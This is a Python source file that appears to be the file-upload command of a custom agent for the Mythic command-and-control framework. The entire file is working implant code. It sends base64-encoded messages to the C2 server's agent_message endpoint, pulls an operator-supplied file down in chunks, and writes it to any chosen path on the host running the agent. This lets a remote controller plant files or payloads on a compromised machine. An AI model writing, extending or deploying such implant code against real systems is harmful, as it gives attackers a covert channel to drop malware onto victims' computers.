import os
import json
import base64

CHUNK_SIZE = 512 * 1024  # 512 KB


def _fetch_chunk(callback_id, task_id, file_id, chunk_num, dest):
    import agent  # deferred to avoid circular import — agent.py imports this module
    body = {
        "action": "post_response",
        "uuid": callback_id,
        "responses": [{
            "task_id": task_id,
            "upload": {
                "chunk_size": CHUNK_SIZE,
                "file_id":    file_id,
                "chunk_num":  chunk_num,
                "full_path":  dest,
            },
        }],
    }
    encoded = base64.b64encode((callback_id + json.dumps(body)).encode())
    r = agent.SESSION.post(f"{agent.BASE_URL}/agent_message", data=encoded, timeout=30)
    resp = json.loads(base64.b64decode(r.content)[36:])
    return resp.get("responses", [{}])[0]


def execute(params, task_id, callback_id):
    import agent  # deferred to avoid circular import — agent.py imports this module
    try:
        parsed = json.loads(params)
        file_id = parsed.get("file", "").strip()
        dest = parsed.get("dest", "").strip()
    except Exception:
        agent.post_response(callback_id, task_id, "upload: invalid parameters")
        return None

    if not file_id or not dest:
        agent.post_response(callback_id, task_id, "upload: file and dest are required")
        return None

    try:
        # Fetch first chunk — Mythic returns total_chunks in the first response
        chunk_resp = _fetch_chunk(callback_id, task_id, file_id, 1, dest)
        total_chunks = chunk_resp.get("total_chunks", 1)
        chunk_data = base64.b64decode(chunk_resp.get("chunk_data", ""))

        # Ensure destination directory exists
        os.makedirs(os.path.dirname(os.path.abspath(dest)), exist_ok=True)

        with open(dest, "wb") as fh:
            fh.write(chunk_data)
            for chunk_num in range(2, total_chunks + 1):
                chunk_resp = _fetch_chunk(callback_id, task_id, file_id, chunk_num, dest)
                fh.write(base64.b64decode(chunk_resp.get("chunk_data", "")))

        agent.post_response(callback_id, task_id, f"uploaded to {dest}")
    except Exception as e:
        agent.post_response(callback_id, task_id, f"upload error: {str(e)}")

    return None  # always — this command manages all its own posts
